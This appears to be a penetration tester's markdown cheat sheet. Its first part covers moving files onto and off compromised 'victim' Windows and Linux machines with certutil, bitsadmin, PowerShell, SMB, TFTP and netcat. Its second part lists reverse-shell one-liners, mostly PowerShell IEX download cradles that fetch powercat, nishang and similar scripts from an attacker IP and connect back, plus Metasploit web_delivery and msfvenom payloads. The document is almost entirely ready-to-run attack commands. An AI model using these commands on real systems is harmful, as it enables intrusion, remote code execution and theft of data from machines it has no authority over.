# myfiles
## Windows File Transfer


### IWR (Invoke-Web Request)
First exploit the victim machine, use Netcat to receive the incoming connection
```
nc -lvp 4444
```
Attacker: 
```
python -m SimpleHTTPServer 80
```
Victim: 
```
powershell.exe -command iwr -Uri http://192.168.1.2/putty.exe -OutFile C:\Temp\putty.exe "
dir

powershell.exe iwr -uri 192.168.1.2/putty.exe -o C:\Temp\putty.exe

powershell
iwr -uri 192.168.1.2/putty.exe -o C:\Temp\putty.exe
dir
```

### Certutil

Attacker: 
```
python -m SimpleHTTPServer 80
```
Victim:
```
certutil -urlcache -f http://192.168.1.2/putty.exe putty.exe
or
certutil -urlcache -split -f http://192.168.1.2/putty.exe putty.exe
```

### Bitsadmin
Attacker: 
```
python -m SimpleHTTPServer 80
```
Victim:
```
bitsadmin /transfer job https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe C:\Temp\putty.exe
```

### Curl

Attacker: 
```
python -m SimpleHTTPServer 80
```
Victim:
```
curl http://192.168.1.2/putty.exe -o putty.exe
dir
```

Wget
----
Attacker: 
```
python -m SimpleHTTPServer 80
```
Victim: Open Powershell on the windows machine and run the following command. Mention the path to download the file from and then give the output path to save the file putty.exe.
```
powershell 
wget http://192.168.1.2/putty.exe -OutFile putty.exe
dir

powershell.exe wget http://192.168.1.2/putty.exe -OutFile putty.exe
```
### Powershell

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/putty.exe', 'putty.exe')

dir
```
### SMB Server Impacket-Smbserver


Attacker Machine: On the attacker, the machine goes to the directory from which the file is to be transferred. Then let’s make use of Impacket-smbserver to share this file from the local machine.
Note: Impacket provides low-level programming access to some packets for certain protocols in the network.
(Run SMB oneliner instead of python server)
```
impacket-smbserver share $(pwd) -smb2support

impacket-smbserver share /root/Downloads/test -smb2support
```
Victim Machine:
```
copy \\192.168.1.2\share\putty.exe
dir
or
net use \\192.168.1.2\share
net use
copy \\192.168.1.2\share\putty.exe
dir
```
*Using a different Operating system where Impacket is not installed by default----

Attacker Machine: On the attacker, the machine goes to the directory from which the file is to be transferred.
Install: https://www.hackingarticles.in/impacket-guide-smb-msrpc/
```
python3 smbserver.py share /root/test -smb2support
```
Victim Machine:
```
copy \\192.168.1.2\share\putty.exe
dir
```
### TFTP

Run Metasploit
```
use auxiliary/server/tftp
set srvhost IP
set tftproot "file path /root/file.txt"
exploit
```
Victim Machine:
```
tftp -i 192.168.1.2 GET file.txt
```
### FTP (When file name is known only)

Victim Machine:
```
ftp 192.168.1.5 
get file.txt
dir
```
## LINUX File Transfer


### PHP Web-Server


Attacker Machine: 
```
php -S 0.0.0.0:8080
```
Victim Machine: On the victim machine’s web browser 
```
192.168.1.6:8080/putty.exe
```
### Apache


Attacker Machine: before transferring file through web directories and then move any file into the HTML directory to share it. Then restart the apache service.
```
root@kali[/Download/Test]- cp putty.exe /var/www/html
service apache2 restart
```
Victim Machine:
```
192.168.1.6/putty.exe
```
### Simple HTTP server

```
python -m SimpleHTTPServer
python3 -m http.server 8000
```
Victim Machine:
```
192.168.q.6:8000
```
### Curl
```
curl -O http://192.168.1.6/putty.exe
```
### Wget
```
wget 192.168.1.6/putty.exe
```
### Netcat
```
Attacker:
nc -lvp 5555 > file.txt

Victim:
nc 192.168.1.6 5555 < file.txt
```
### SCP
```
Attacker Machine:
scp file.txt kali@192.168.1.6:/tmp

Victim:
cd /tmp
cat file.txt
```
### SMB-Client

```
Attacker:
smbclient -L 192.168.1.21 -U raj%123

Victim:
smbclient  //192.168.1.21/share -U raj%123
```
### Meterpreter

```
Attacker Machine:
meterpreter> download file.txt /root/Desktop/
```
### FTP
```
Attacker Machine:
pip install pyftpdlib
python3 -m pyftpdlib -p 21 -u jeenali -P 123

Victim Machine:
ftp 192.168.1.5

or browser ftp://192.168.1.5
```

# Reverse Shell

## Windows Reverse Shell


### Powercat 


Kali:
```
wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

python -m SimpleHTTPServer 80

nc -vlp 4444
```
Win Victim: (Run on CMD)
```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.42.129/powercat.ps1');powercat -c 192.168.42.129 -p 4444 -e cmd"
```
### Invoke-PowercatShellTcp (Nishang)


Kali:
```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

python -m SimpleHTTPServer 80

nc -vlp 4444
```
Win Victim: (Run on CMD)
```
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.42.129/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.42.129 -Port 4444
```
### ConptyShell


Kali:
```
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1

python -m SimpleHTTPServer 80

stty raw -echo; (stty size; cat) | nc -lvnp 4444
```
Win Victim: (Run on CMD)
```
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.42.129/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.42.129 4444
```
### mini-reverse.ps1


Kali:
```
wget https://gist.githubusercontent.com/Serizao/6a63f35715a8219be6b97da3e51567e7/raw/f4283f758fb720c2fe263b8f7696b896c9984fcf/mini-reverse.ps1

cat mini-reverse.ps1 
nano mini-reverse.ps1	(Edit IP/Port for reverse connection)

python -m SimpleHTTPServer 80

nc -vlp 4444
```
Win Victim: (Run on CMD)
```
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.42.129/mini-reverse.ps1')
```
### PowerShell Reverse TCP 


Kali:
```
wget https://raw.githubusercontent.com/ivan-sincek/powershell-reverse-tcp/master/src/original/powershell_reverse_tcp.ps1

cat powershell_reverse_tcp.ps1 
nano powershell_reverse_tcp.ps1	(Edit IP/Port for reverse connection)

python -m SimpleHTTPServer 80

nc -vlp 4444
```
Win Victim: (Run on CMD)
```
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.42.129/powershell_reverse_tcp.ps1')
```
### Web_Delivery


Kali: using meterpreter payload
```
msfconsole

use exploit/multi/script/web delivery
show targets 
set target 2 (PSH)
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.42.129
set lport 4444
exploit
```
copy the payload and run on Victim CMD

Win Victim: (Run on CMD) copy the payload and run on Victim CMD

Kali:
```
sessions 1
sysinfo
```
### MSFVenom

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

python -m SimpleHTTPServer 80

nc -lvp 4444
```
Victim:
```
browse - 192.168.1.2:8080
```
















































